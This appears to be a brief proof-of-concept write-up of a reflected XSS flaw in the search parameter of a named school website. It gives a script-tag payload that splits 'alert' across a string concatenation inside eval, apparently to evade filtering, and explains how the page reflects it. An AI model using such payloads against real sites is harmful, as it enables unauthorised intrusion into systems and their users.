# Syndica

# Command 
```HTML
https://dism.edu.sg/search?<script>eval("a"+"lert('xss_by_sam_tan')")</script>=script****
```

# Explaination
- The search parameter is vulnerable to reflected XSS.
- The payload `<script>eval("a"+"lert('xss_by_sam_tan')")</script>` is injected into the search parameter.
- When the search results are displayed, the script is executed, displaying an alert box with the message `xss_by_sam_tan`.
